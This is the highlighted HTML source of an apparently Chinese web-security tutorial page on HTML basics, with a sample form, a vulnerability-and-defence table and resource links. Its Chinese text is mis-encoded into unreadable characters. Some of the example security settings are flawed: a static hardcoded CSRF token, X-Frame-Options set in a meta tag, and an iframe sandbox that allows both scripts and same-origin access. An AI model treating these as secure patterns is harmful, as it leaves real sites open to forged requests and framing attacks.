class="string">&quot;default-src &#x27;self&#x27;; script-src &#x27;self&#x27; https://trusted.cdn.com; style-src &#x27;self&#x27; &#x27;unsafe-inline&#x27;&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-Frame-Options&quot;</span> <span class="attr">content</span>=<span class="string">&quot;DENY&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>WEBå®‰å…¨å­¦ä¹ å¹³å° - HTMLåŸºç¡€æ•™ç¨‹<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="language-css"></span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">body</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: <span class="string">&#x27;Microsoft YaHei&#x27;</span>, sans-serif;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">line-height</span>: <span class="number">1.6</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#333</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">header</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.container</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">max-width</span>: <span class="number">1200px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">0</span> auto;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.section</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#f9f9f9</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-bottom</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-left</span>: <span class="number">4px</span> solid <span class="number">#3498db</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">width</span>: <span class="number">100%</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-collapse</span>: collapse;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin</span>: <span class="number">10px</span> <span class="number">0</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> <span class="selector-tag">th</span>, <span class="selector-class">.security-table</span> <span class="selector-tag">td</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">12px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border</span>: <span class="number">1px</span> solid <span class="number">#ddd</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.security-table</span> <span class="selector-tag">th</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background-color</span>: <span class="number">#f2f2f2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.high-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#e74c3c</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.medium-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#f39c12</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.low-risk</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#2ecc71</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-weight</span>: bold;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-class">.code-block</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2d2d2d</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: <span class="number">#f8f8f2</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">15px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">overflow-x</span>: auto;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">font-family</span>: monospace;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">        <span class="selector-tag">footer</span> &#123;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">text-align</span>: center;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">margin-top</span>: <span class="number">30px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">padding</span>: <span class="number">20px</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">background</span>: <span class="number">#2c3e50</span>;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">color</span>: white;</span></span><br><span class="line"><span class="language-css">            <span class="attribute">border-radius</span>: <span class="number">5px</span>;</span></span><br><span class="line"><span class="language-css">        &#125;</span></span><br><span class="line"><span class="language-css">    </span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">header</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h1</span>&gt;</span>WEBå®‰å…¨å­¦ä¹ å¹³å°<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTMLåŸºç¡€æ•™ç¨‹ - å®‰å…¨æ¸—é€å¿…å¤‡æŠ€èƒ½<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">header</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;introduction&quot;</span>&gt;</span>ä¸€ã€HTMLåŸºç¡€æ¦‚è¿°<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>HTMLï¼ˆè¶…æ–‡æœ¬æ ‡è®°è¯­è¨€ï¼‰æ˜¯æ„å»ºWebé¡µé¢çš„åŸºç¡€ï¼Œæ˜¯WEBå®‰å…¨äººå‘˜å¿…é¡»æŒæ¡çš„æ ¸å¿ƒæŠ€èƒ½ä¹‹ä¸€ã€‚æŒæ¡HTMLæœ‰åŠ©äºç†è§£ç½‘é¡µç»“æ„ã€è¯†åˆ«æ½œåœ¨å®‰å…¨æ¼æ´ï¼ˆå¦‚XSSã€CSRFç­‰ï¼‰ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>HTMLæ–‡æ¡£ç»“æ„<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">pre</span> <span class="attr">class</span>=<span class="string">&quot;code-block&quot;</span>&gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>!DOCTYPE html<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>html lang=&quot;zh-CN&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>head<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>meta charset=&quot;UTF-8&quot;<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>title<span class="symbol">&amp;gt;</span>ç¤ºä¾‹é¡µé¢<span class="symbol">&amp;lt;</span>/title<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/head<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>body<span class="symbol">&amp;gt;</span></span><br><span class="line">    <span class="symbol">&amp;lt;</span>!-- é¡µé¢å†…å®¹ --<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/body<span class="symbol">&amp;gt;</span></span><br><span class="line"><span class="symbol">&amp;lt;</span>/html<span class="symbol">&amp;gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">pre</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;form-example&quot;</span>&gt;</span>äºŒã€è¡¨å•å®‰å…¨ç¤ºä¾‹<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¡¨å•æ˜¯WEBåº”ç”¨ä¸­å¸¸è§æ¼æ´æ¥æºï¼Œäº†è§£è¡¨å•ç»“æ„æœ‰åŠ©äºè¯†åˆ«å®‰å…¨é—®é¢˜ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/submit&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;username&quot;</span>&gt;</span>ç”¨æˆ·å:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;username&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;è¯·è¾“å…¥ç”¨æˆ·å&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;password&quot;</span>&gt;</span>å¯†ç :<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">id</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">minlength</span>=<span class="string">&quot;8&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;file&quot;</span>&gt;</span>ä¸Šä¼ å¤´åƒ:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">id</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;avatar&quot;</span> <span class="attr">accept</span>=<span class="string">&quot;image/*&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;email&quot;</span>&gt;</span>é‚®ç®±:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;email&quot;</span> <span class="attr">id</span>=<span class="string">&quot;email&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">required</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;color&quot;</span>&gt;</span>é€‰æ‹©é¢œè‰²:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;color&quot;</span> <span class="attr">id</span>=<span class="string">&quot;color&quot;</span> <span class="attr">name</span>=<span class="string">&quot;color&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#ff0000&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                </span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;æäº¤è¡¨å•&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;csrf_token&quot;</span> <span class="attr">value</span>=<span class="string">&quot;abc123&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">strong</span>&gt;</span>å®‰å…¨æç¤ºï¼š<span class="tag">&lt;/<span class="name">strong</span>&gt;</span>è¡¨å•åº”ä½¿ç”¨HTTPSä¼ è¾“ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œä¸¥æ ¼éªŒè¯ï¼Œé˜²æ­¢XSSå’ŒSQLæ³¨å…¥æ”»å‡»ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;table-example&quot;</span>&gt;</span>ä¸‰ã€æ•°æ®è¡¨æ ¼ç¤ºä¾‹<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¡¨æ ¼å¸¸ç”¨äºå±•ç¤ºç»“æ„åŒ–æ•°æ®ï¼Œå®‰å…¨äººå‘˜éœ€ç†è§£å…¶ç»“æ„ä»¥è¯†åˆ«æ½œåœ¨æ¼æ´ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;security-table&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">caption</span>&gt;</span>å¸¸è§Webå®‰å…¨æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">caption</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ¼æ´ç±»å‹<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>å±å®³ç­‰çº§<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>æ£€æµ‹æ–¹æ³•<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">th</span>&gt;</span>é˜²å¾¡æªæ–½<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>XSSï¼ˆè·¨ç«™è„šæœ¬ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>è¾“å…¥éªŒè¯ã€è¾“å‡ºç¼–ç æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>å¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œè¿‡æ»¤ï¼Œå¯¹è¾“å‡ºè¿›è¡ŒHTMLç¼–ç <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLæ³¨å…¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>SQLè¯­å¥å‚æ•°åŒ–æŸ¥è¯¢æ£€æŸ¥<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>ä½¿ç”¨é¢„ç¼–è¯‘è¯­å¥ã€ORMæ¡†æ¶<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>CSRFï¼ˆè·¨ç«™è¯·æ±‚ä¼ªé€ ï¼‰<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;medium-risk&quot;</span>&gt;</span>ä¸­<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ£€æŸ¥Refererå¤´ã€CSRFä»¤ç‰ŒéªŒè¯<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>å®æ–½CSRFä»¤ç‰Œæœºåˆ¶ã€SameSite Cookieå±æ€§<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ–‡ä»¶ä¸Šä¼ æ¼æ´<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span> <span class="attr">class</span>=<span class="string">&quot;high-risk&quot;</span>&gt;</span>é«˜<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>æ£€æŸ¥æ–‡ä»¶ç±»å‹éªŒè¯<span class="tag">&lt;<span class="name">br</span>&gt;</span>æŸ¥çœ‹æ–‡ä»¶å­˜å‚¨è·¯å¾„æ˜¯å¦å¯é¢„æµ‹<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">td</span>&gt;</span>é™åˆ¶æ–‡ä»¶ç±»å‹<span class="tag">&lt;<span class="name">br</span>&gt;</span>é‡å‘½åä¸Šä¼ æ–‡ä»¶<span class="tag">&lt;<span class="name">br</span>&gt;</span>å°†ä¸Šä¼ æ–‡ä»¶å­˜å‚¨åœ¨éWebå¯è®¿é—®ç›®å½•<span class="tag">&lt;<span class="name">br</span>&gt;</span>æ£€æŸ¥æ–‡ä»¶å†…å®¹<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;resources&quot;</span>&gt;</span>å››ã€å­¦ä¹ èµ„æº<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>ä»¥ä¸‹æ˜¯ä¸€äº›WEBå®‰å…¨å­¦ä¹ èµ„æºï¼š<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://owasp.org&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>OWASPï¼ˆå¼€æ”¾Webåº”ç”¨å®‰å…¨é¡¹ç›®ï¼‰<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://portswigger.net&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>PortSwiggerï¼ˆBurp Suiteå¼€å‘è€…ï¼‰<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.freebuf.com&quot;</span> <span class="attr">target</span>=<span class="string">&quot;_blank&quot;</span> <span class="attr">rel</span>=<span class="string">&quot;noopener noreferrer&quot;</span>&gt;</span>FreeBufï¼ˆå®‰å…¨èµ„è®¯å¹³å°ï¼‰<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>ç›¸å…³è§†é¢‘æ•™ç¨‹<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">src</span>=<span class="string">&quot;https://www.youtube.com/embed/dQw4w9WgXcQ&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">width</span>=<span class="string">&quot;560&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">height</span>=<span class="string">&quot;315&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">frameborder</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">allow</span>=<span class="string">&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture&quot;</span> </span></span><br><span class="line"><span class="tag">                <span class="attr">allowfullscreen</span></span></span><br><span class="line"><span class="tag">                <span class="attr">title</span>=<span class="string">&quot;WEBå®‰å…¨å…¥é—¨è§†é¢‘&quot;</span></span></span><br><span class="line"><span class="tag">                <span class="attr">sandbox</span>=<span class="string">&quot;allow-same-origin allow-scripts allow-popups&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;section&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">h2</span> <span class="attr">id</span>=<span class="string">&quot;contact&quot;</span>&gt;</span>äº”ã€è”ç³»æˆ‘ä»¬<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">p</span>&gt;</span>æœ‰ä»»ä½•é—®é¢˜æ¬¢è¿é€šè¿‡ä»¥ä¸‹æ–¹å¼è”ç³»æˆ‘ä»¬ï¼š<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>é‚®ç®±ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:support@websec.com&quot;</span>&gt;</span>support@websec.com<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span>ç”µè¯ï¼š<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;tel:+8613800138000&quot;</span>&gt;</span>138-0013-8000<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            </span><br><span class="line">            <span class="tag">&lt;<span class="name">h3</span>&gt;</span>åé¦ˆè¡¨å•<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;/feedback&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;feedback&quot;</span>&gt;</span>æ‚¨çš„æ„è§:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;feedback&quot;</span> <span class="attr">name</span>=<span class="string">&quot;feedback&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span> <span class="attr">required</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span 